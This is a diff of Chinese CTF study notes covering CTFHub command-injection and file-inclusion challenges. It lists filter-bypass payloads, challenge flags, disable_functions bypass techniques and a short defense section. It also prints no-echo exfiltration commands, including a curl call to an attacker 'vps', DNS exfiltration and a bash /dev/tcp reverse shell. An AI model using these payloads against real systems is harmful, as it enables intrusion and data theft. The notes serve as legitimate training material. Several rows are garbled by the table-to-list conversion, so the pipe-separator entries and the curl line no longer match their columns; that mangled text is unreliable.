@@ -589,15 +697,13 @@ preg_match_all("/(\||&|;| |\/|cat|flag|ctfhub)/", $ip, $m)
 
 **逐段拆解：**
 
-| 片段 | 作用 |
-|---|---|
-| `%0a` | 换行（代替被过滤的 `;` `\|` `&`） |
-| `${PATH:0:1}` | `/` |
-| `bin` | `/bin` |
-| `c?t` | `cat`（`?` 通配） |
-| `${IFS}` | 空格 |
-| `f?ag_is_here` | `flag_is_here`（`?` 通配） |
-| `*` | 目录里的文件 |
+- **`%0a`**：换行（代替被过滤的 `;` `\
+- **`${PATH:0:1}`**：`/`
+- **`bin`**：`/bin`
+- **`c?t`**：`cat`（`?` 通配）
+- **`${IFS}`**：空格
+- **`f?ag_is_here`**：`flag_is_here`（`?` 通配）
+- **`*`**：目录里的文件
 
 **展开后：**
 
@@ -607,12 +713,22 @@ preg_match_all("/(\||&|;| |\/|cat|flag|ctfhub)/", $ip, $m)
 
 ### 文件包含类（4 题，同属 RCE 模块）
 
-| 题 | 过滤 | 打法 | flag |
-|---|---|---|---|
-| 文件包含 1 | `strpos($file,"flag")` | 借 `shell.txt` 里的 `eval($_REQUEST['ctfhub'])` | `ctfhub{b4e8289cf23e6289829fb568}` |
-| 文件包含 2（必须 `php://`） | `substr($file,0,6)==="php://"` | `php://input` + POST 代码 | `ctfhub{29c7fc65ea7034f067119535}` |
-| 文件包含 3（必须 `php://`，flag 路径已知） | 同上 | `php://filter/resource=/flag` | `ctfhub{95366c4682c791d1ff3f4272}` |
-| 文件包含 4（无 shell.txt） | `strpos($file,"flag")` | `php://input` | `ctfhub{3e8215ea4ad95ff54cb15fe2}` |
+- **文件包含 1**
+  - 过滤：`strpos($file,"flag")`
+  - 打法：借 `shell.txt` 里的 `eval($_REQUEST['ctfhub'])`
+  - flag：`ctfhub{b4e8289cf23e6289829fb568}`
+- **文件包含 2（必须 `php://`）**
+  - 过滤：`substr($file,0,6)==="php://"`
+  - 打法：`php://input` + POST 代码
+  - flag：`ctfhub{29c7fc65ea7034f067119535}`
+- **文件包含 3（必须 `php://`，flag 路径已知）**
+  - 过滤：同上
+  - 打法：`php://filter/resource=/flag`
+  - flag：`ctfhub{95366c4682c791d1ff3f4272}`
+- **文件包含 4（无 shell.txt）**
+  - 过滤：`strpos($file,"flag")`
+  - 打法：`php://input`
+  - flag：`ctfhub{3e8215ea4ad95ff54cb15fe2}`
 
 ## 3.6 绕过方式总结（6 类）
 
@@ -620,16 +736,30 @@ preg_match_all("/(\||&|;| |\/|cat|flag|ctfhub)/", $ip, $m)
 
 **目标**：让 `cat /flag` 里的空格不被过滤。
 
-| 手法 | payload | 实测 |
-|---|---|---|
-| **`${IFS}`** | `cat${IFS}/flag` | ✅ **最稳** |
-| `$IFS$9` | `cat$IFS$9/flag` | ✅ |
-| `$IFS` | `cat$IFS/flag` | ✅ |
-| 花括号 | `{cat,/flag}` | ✅ |
-| 重定向 `<` | `cat</flag` | ✅ |
-| 制表符 `%09` | `cat%09/flag` | ✅ |
-| `$'\t'` | `cat$'\t'/flag` | ✅ |
-| `$'\x20'` | `cat$'\x20'/flag` | ✅ |
+- ****`${IFS}`****
+  - payload：`cat${IFS}/flag`
+  - 实测：✅ **最稳**
+- **`$IFS$9`**
+  - payload：`cat$IFS$9/flag`
+  - 实测：✅
+- **`$IFS`**
+  - payload：`cat$IFS/flag`
+  - 实测：✅
+- **花括号**
+  - payload：`{cat,/flag}`
+  - 实测：✅
+- **重定向 `<`**
+  - payload：`cat</flag`
+  - 实测：✅
+- **制表符 `%09`**
+  - payload：`cat%09/flag`
+  - 实测：✅
+- **`$'\t'`**
+  - payload：`cat$'\t'/flag`
+  - 实测：✅
+- **`$'\x20'`**
+  - payload：`cat$'\x20'/flag`
+  - 实测：✅
 
 **⚠️ 反直觉的实测结果：**
 
@@ -652,15 +782,27 @@ echo${IFS}hello  → 明确变量名是 IFS → hello ✅
 
 ### 3.6.2 关键字绕过
 
-| 手法 | payload | 实测 |
-|---|---|---|
-| **反斜杠** | `ec\ho` | ✅ |
-| 单/双引号 | `ec''ho` / `ec""ho` | ✅ |
-| 变量拼接 | `a=ec;b=ho;$a$b` | ✅ |
-| 通配 `?` | `/bin/ec?o` | ✅ |
-| 通配 `*` | `/bin/e*` | ⚠️ 会匹配到多个（`/bin/editor` 等）→ 失败 |
-| 命令替换 | `$(echo ec)ho` | ✅ |
-| 反引号 | `` `echo ec`ho `` | ✅ |
+- ****反斜杠****
+  - payload：`ec\ho`
+  - 实测：✅
+- **单/双引号**
+  - payload：`ec''ho` / `ec""ho`
+  - 实测：✅
+- **变量拼接**
+  - payload：`a=ec;b=ho;$a$b`
+  - 实测：✅
+- **通配 `?`**
+  - payload：`/bin/ec?o`
+  - 实测：✅
+- **通配 `*`**
+  - payload：`/bin/e*`
+  - 实测：⚠️ 会匹配到多个（`/bin/editor` 等）→ 失败
+- **命令替换**
+  - payload：`$(echo ec)ho`
+  - 实测：✅
+- **反引号**
+  - payload：`` `echo ec`ho ``
+  - 实测：✅
 
 **⚠️ `*` 的坑（实测）：**
 
@@ -680,30 +822,42 @@ c?t          → 在【当前目录】找 → 没有匹配 → 命令不存在 �
 
 **常用替换表：**
 
-| 原字符 | 替代 |
-|---|---|
-| `cat` | `tac` / `c\at` / `c'a't` / `/bin/c?t` / `$a$b` |
-| `flag` | `f?ag` / `f*` / `????_??_????` / `[f]lag` |
-| 空格 | `${IFS}` / `$IFS$9` / `<` / `%09` |
-| 斜杠 | `${PATH:0:1}` / `$'\57'` |
+- **`cat`**：`tac` / `c\at` / `c'a't` / `/bin/c?t` / `$a$b`
+- **`flag`**：`f?ag` / `f*` / `????_??_????` / `[f]lag`
+- **空格**：`${IFS}` / `$IFS$9` / `<` / `%09`
+- **斜杠**：`${PATH:0:1}` / `$'\57'`
 
 ### 3.6.3 命令分隔符
 
-| 符号 | 行为 | 前者输出去哪 |
-|---|---|---|
-| `;` | 顺序执行 | 直接输出（被 exec 收集） |
-| **`\|`** | **管道** | **喂给后者 stdin → 被丢弃** ✅ |
-| `\|\|` | 前者失败才执行 | 直接输出 |
-| `&&` | 前者成功才执行 | 直接输出 |
-| `&` | 后台 | 直接输出 |
-| **`%0a`（换行）** | 同 `;` | 直接输出 |
+- **`;`**
+  - 行为：顺序执行
+  - 前者输出去哪：直接输出（被 exec 收集）
+- ****`\**
+  - 行为：`**
+  - 前者输出去哪：**管道**
+- **`\**
+  - 行为：\
+  - 前者输出去哪：`
+- **`&&`**
+  - 行为：前者成功才执行
+  - 前者输出去哪：直接输出
+- **`&`**
+  - 行为：后台
+  - 前者输出去哪：直接输出
+- ****`%0a`（换行）****
+  - 行为：同 `;`
+  - 前者输出去哪：直接输出
 
 **为什么本题用 `|` 更好（实测耗时对比）：**
 
-| payload | 拼成的命令 | 耗时 | 输出行数 |
-|---|---|---|---|
-| `127.0.0.1;id` | `ping -c 4 127.0.0.1;id` | **3425 ms** | 9 行（混） |
-| **`\|id`** | `ping -c 4 \|id` | **347 ms** | **1 行** |
+- **`127.0.0.1;id`**
+  - 拼成的命令：`ping -c 4 127.0.0.1;id`
+  - 耗时：**3425 ms**
+  - 输出行数：9 行（混）
+- ****`\**
+  - 拼成的命令：id`**
+  - 耗时：`ping -c 4 \
+  - 输出行数：id`
 
 **原因：`|` 让 `ping -c 4` 立刻失败（不用等 4 秒），且它的 stdout 被管道吃掉。**
 
@@ -726,28 +880,52 @@ echo 'Y2F0IC9mbGFn' | base64 -d | bash    # cat /flag
 
 ### 3.6.5 无回显外带（5 种）
 
-| 方法 | 命令 | 前提 |
-|---|---|---|
-| **写文件** | `id > /var/www/html/o.txt` | 知道 web 根 + 可写 |
-| **HTTP 外带** | `curl http://vps/?x=$(id\|base64 -w0)` | 能出网 |
-| **DNS 外带** | `ping -c1 $(whoami).dns.com` | 只放行 DNS 也行 |
-| **时间盲注** | `if [ $(cut -c1 /flag) = "f" ]; then sleep 3; fi` | 只能观察耗时 |
-| **反弹 shell** | `bash -i >& /dev/tcp/vps/4444 0>&1` | 能出网 |
+- ****写文件****
+  - 命令：`id > /var/www/html/o.txt`
+  - 前提：知道 web 根 + 可写
+- ****HTTP 外带****
+  - 命令：`curl http://vps/?x=$(id\
+  - 前提：base64 -w0)`
+- ****DNS 外带****
+  - 命令：`ping -c1 $(whoami).dns.com`
+  - 前提：只放行 DNS 也行
+- ****时间盲注****
+  - 命令：`if [ $(cut -c1 /flag) = "f" ]; then sleep 3; fi`
+  - 前提：只能观察耗时
+- ****反弹 shell****
+  - 命令：`bash -i >& /dev/tcp/vps/4444 0>&1`
+  - 前提：能出网
 
 ### 3.6.6 禁用函数绕过（10 种）
 
-| 手法 | 原理 | 前提 |
-|---|---|---|
-| **`LD_PRELOAD` + `putenv` + `mail`** | `mail()` 第 5 参数触发 `sendmail`，加载恶意 `.so` | 能上传 `.so` |
-| Apache Mod CGI | 上传 `.htaccess` 启用 CGI | Apache |
-| PHP-FPM / FastCGI | 打 FPM 端口 | 能访问 |
-| Shellshock | `BASH_ENV` 注入 | bash < 4.3 |
-| `imap_open` | mailbox 参数注入 | `imap` 扩展 |
-| **`pcntl_exec`** | **常被忘在 `disable_functions` 之外** | `pcntl` 扩展 |
-| Windows COM | `new COM("WScript.Shell")` | Windows |
-| `putenv` + `error_log` | 同 LD_PRELOAD 思路 | |
-| `bash` 的 `enable -f` | 加载自定义内建命令 | |
-| `win32std` | `win_exec` | Windows |
+- ****`LD_PRELOAD` + `putenv` + `mail`****
+  - 原理：`mail()` 第 5 参数触发 `sendmail`，加载恶意 `.so`
+  - 前提：能上传 `.so`
+- **Apache Mod CGI**
+  - 原理：上传 `.htaccess` 启用 CGI
+  - 前提：Apache
+- **PHP-FPM / FastCGI**
+  - 原理：打 FPM 端口
+  - 前提：能访问
+- **Shellshock**
+  - 原理：`BASH_ENV` 注入
+  - 前提：bash < 4.3
+- **`imap_open`**
+  - 原理：mailbox 参数注入
+  - 前提：`imap` 扩展
+- ****`pcntl_exec`****
+  - 原理：**常被忘在 `disable_functions` 之外**
+  - 前提：`pcntl` 扩展
+- **Windows COM**
+  - 原理：`new COM("WScript.Shell")`
+  - 前提：Windows
+- **`putenv` + `error_log`**
+  - 原理：同 LD_PRELOAD 思路
+- **`bash` 的 `enable -f`**
+  - 原理：加载自定义内建命令
+- **`win32std`**
+  - 原理：`win_exec`
+  - 前提：Windows
 
 ### 3.6.7 文件包含专项：`php://filter` 过滤器链 RCE
 
@@ -773,14 +951,12 @@ bin boot dev etc flag_3213 home lib ...
 
 ## 3.7 防御
 
-| 层面 | 做法 |
-|---|---|
-| **不拼字符串** | `escapeshellarg()` / `escapeshellcmd()` |
-| **白名单** | `filter_var($ip, FILTER_VALIDATE_IP)` |
-| **不用 shell** | `proc_open` 传数组（PHP 7.4+ 支持 `["cmd","arg1"]`） |
-| **禁用函数** | `disable_functions = system,exec,shell_exec,passthru,popen,proc_open,pcntl_exec` |
-| **最小权限** | web 用户不能读 `/flag`、不能出网 |
-| **open_basedir** | 限制可访问目录 |
+- ****不拼字符串****：`escapeshellarg()` / `escapeshellcmd()`
+- ****白名单****：`filter_var($ip, FILTER_VALIDATE_IP)`
+- ****不用 shell****：`proc_open` 传数组（PHP 7.4+ 支持 `["cmd","arg1"]`）
+- ****禁用函数****：`disable_functions = system,exec,shell_exec,passthru,popen,proc_open,pcntl_exec`
+- ****最小权限****：web 用户不能读 `/flag`、不能出网
+- ****open_basedir****：限制可访问目录
 
 ```php
 // 危险
@@ -831,31 +1007,75 @@ system("ping -c 1 " . $_GET['ip']);
 
 ## 4.2 踩坑清单（23 条）
 
-| # | 坑 | 教训 |
-|---|---|---|
-| 1 | `python GitHack.py` 报 `can't open file` | Kali 上 `python` 就是 Python3，GitHack 要 `python2` |
-| 2 | GitHack `ModuleNotFoundError: urlparse` | 它是 2017 年的 Py2 代码 |
-| 3 | `fatal: not a git repository` | 在工具目录而非 `dist/<目标>/` |
-| 4 | `cd dist/$T` 找不到 | 目录名是 netloc 的 `:` → `_`，且去掉 `http://` |
-| 5 | `wget --cut-dirs=1` 削掉了 `.git` 层 | 产物目录本身就是 `.git`，要 `mv dumped repo/.git` |
-| 6 | `--cc` 出不来内容 | **是我 grep 正则 `^[+-][^+-]` 排除了 `++` 前缀**，不是 git 的问题 |
-| 7 | 凭"index 有 3 个条目"判成 Index 题 | **HEAD tree 也是 3 个，差集为空** —— 判据要算差集 |
-| 8 | `curl .svn/wc.db` 报二进制警告 | **二进制文件必须 `-o`** |
-| 9 | 只看 `NODES` 漏掉被删文件 | 要看 `PRISTINE` 的 `refcount = 0` |
-| 10 | `.hg/store/data/flag_xxx.txt.i` → 404 | **`_` 要转义成 `__`** |
-| 11 | revlog 解压报 `incomplete stream` | 首字节 `'u'` = 原文，不是 zlib |
-| 12 | `rip-hg.pl` 报 `cannot find hg` | 要先 `apt install mercurial` |
-| 13 | `ghproxy.net` 502 | 换 `gh-proxy.com` |
-| 14 | **HackBar 里 body 被 URL 编码** | 看到 `%3C%3Fphp...` = 编码了；`php://input` 不解码 |
-| 15 | **`-G` 把 body 变成 URL 参数** | `php://input` 就没 body 了 |
-| 16 | **`eval` 里漏分号** → 空白 | PHP 语句要 `;`（除非后面跟 `?>`） |
-| 17 | **`exec` 空白** = 输出走了 stderr | **加 `2>&1` 看错误** |
-| 18 | `c?t` 命令不存在 | 通配符只在"所在目录"匹配，必须写 `/bin/c?t` |
-| 19 | `cat flag_is_here/` 空白 | `cat` 的是目录 → `Is a directory` |
-| 20 | **curl 吃掉 `${PATH:0:1}` 的花括号** | **URL globbing！加 `-g`** |
-| 21 | `--data-urlencode` 把 `%0a` 再编码 | 用 `$'\n'` 发真换行 |
-| 22 | 表单框里填 `%0a` 无效 | `<input>` 单行 + `%` 会被编码成 `%25` |
-| 23 | 页面看不到 flag 但 Response 有 | **`<?php` 在 HTML 里是"伪注释"，会被吃** → 用 `base64` |
+- **1**
+  - 坑：`python GitHack.py` 报 `can't open file`
+  - 教训：Kali 上 `python` 就是 Python3，GitHack 要 `python2`
+- **2**
+  - 坑：GitHack `ModuleNotFoundError: urlparse`
+  - 教训：它是 2017 年的 Py2 代码
+- **3**
+  - 坑：`fatal: not a git repository`
+  - 教训：在工具目录而非 `dist/<目标>/`
+- **4**
+  - 坑：`cd dist/$T` 找不到
+  - 教训：目录名是 netloc 的 `:` → `_`，且去掉 `http://`
+- **5**
+  - 坑：`wget --cut-dirs=1` 削掉了 `.git` 层
+  - 教训：产物目录本身就是 `.git`，要 `mv dumped repo/.git`
+- **6**
+  - 坑：`--cc` 出不来内容
+  - 教训：**是我 grep 正则 `^[+-][^+-]` 排除了 `++` 前缀**，不是 git 的问题
+- **7**
+  - 坑：凭"index 有 3 个条目"判成 Index 题
+  - 教训：**HEAD tree 也是 3 个，差集为空** —— 判据要算差集
+- **8**
+  - 坑：`curl .svn/wc.db` 报二进制警告
+  - 教训：**二进制文件必须 `-o`**
+- **9**
+  - 坑：只看 `NODES` 漏掉被删文件
+  - 教训：要看 `PRISTINE` 的 `refcount = 0`
+- **10**
+  - 坑：`.hg/store/data/flag_xxx.txt.i` → 404
+  - 教训：**`_` 要转义成 `__`**
+- **11**
+  - 坑：revlog 解压报 `incomplete stream`
+  - 教训：首字节 `'u'` = 原文，不是 zlib
+- **12**
+  - 坑：`rip-hg.pl` 报 `cannot find hg`
+  - 教训：要先 `apt install mercurial`
+- **13**
+  - 坑：`ghproxy.net` 502
+  - 教训：换 `gh-proxy.com`
+- **14**
+  - 坑：**HackBar 里 body 被 URL 编码**
+  - 教训：看到 `%3C%3Fphp...` = 编码了；`php://input` 不解码
+- **15**
+  - 坑：**`-G` 把 body 变成 URL 参数**
+  - 教训：`php://input` 就没 body 了
+- **16**
+  - 坑：**`eval` 里漏分号** → 空白
+  - 教训：PHP 语句要 `;`（除非后面跟 `?>`）
+- **17**
+  - 坑：**`exec` 空白** = 输出走了 stderr
+  - 教训：**加 `2>&1` 看错误**
+- **18**
+  - 坑：`c?t` 命令不存在
+  - 教训：通配符只在"所在目录"匹配，必须写 `/bin/c?t`
+- **19**
+  - 坑：`cat flag_is_here/` 空白
+  - 教训：`cat` 的是目录 → `Is a directory`
+- **20**
+  - 坑：**curl 吃掉 `${PATH:0:1}` 的花括号**
+  - 教训：**URL globbing！加 `-g`**
+- **21**
+  - 坑：`--data-urlencode` 把 `%0a` 再编码
+  - 教训：用 `$'\n'` 发真换行
+- **22**
+  - 坑：表单框里填 `%0a` 无效
+  - 教训：`<input>` 单行 + `%` 会被编码成 `%25`
+- **23**
+  - 坑：页面看不到 flag 但 Response 有
+  - 教训：**`<?php` 在 HTML 里是"伪注释"，会被吃** → 用 `base64`
 
 ## 4.3 方法论
 
@@ -938,15 +1158,13 @@ ctfhub{52dd316df7c89131d95b8161}    HG 第二实例
 
 ## 附录 B：参考材料
 
-| 文件 | 内容 |
-|---|---|
-| `notes/17-信息泄露漏洞.md` | 769 行，五类信息泄露 + 三库统一框架 |
-| `notes/18-做题常见疑问.md` | 836 行，25 个实战问答 |
-| `notes/20-信息泄露作业答案.md` | 403 行，五问完整答案 |
-| `notes/21-PHP命令执行与绕过.md` | 546 行，8 函数实测 + 6 类绕过 |
-| `writeups/靶场/CTFHub-GitStash.md` | 535 行，Stash 专题 WP |
-| `writeups/靶场/CTFHub-基础认证.md` | 494 行，Basic Auth 专题 WP |
-| `logs/2026-10-17.md` | 361 行，当日流水（含 12 条踩坑） |
+- **`notes/17-信息泄露漏洞.md`**：769 行，五类信息泄露 + 三库统一框架
+- **`notes/18-做题常见疑问.md`**：836 行，25 个实战问答
+- **`notes/20-信息泄露作业答案.md`**：403 行，五问完整答案
+- **`notes/21-PHP命令执行与绕过.md`**：546 行，8 函数实测 + 6 类绕过
+- **`writeups/靶场/CTFHub-GitStash.md`**：535 行，Stash 专题 WP
+- **`writeups/靶场/CTFHub-基础认证.md`**：494 行，Basic Auth 专题 WP
+- **`logs/2026-10-17.md`**：361 行，当日流水（含 12 条踩坑）
 
 ---
 
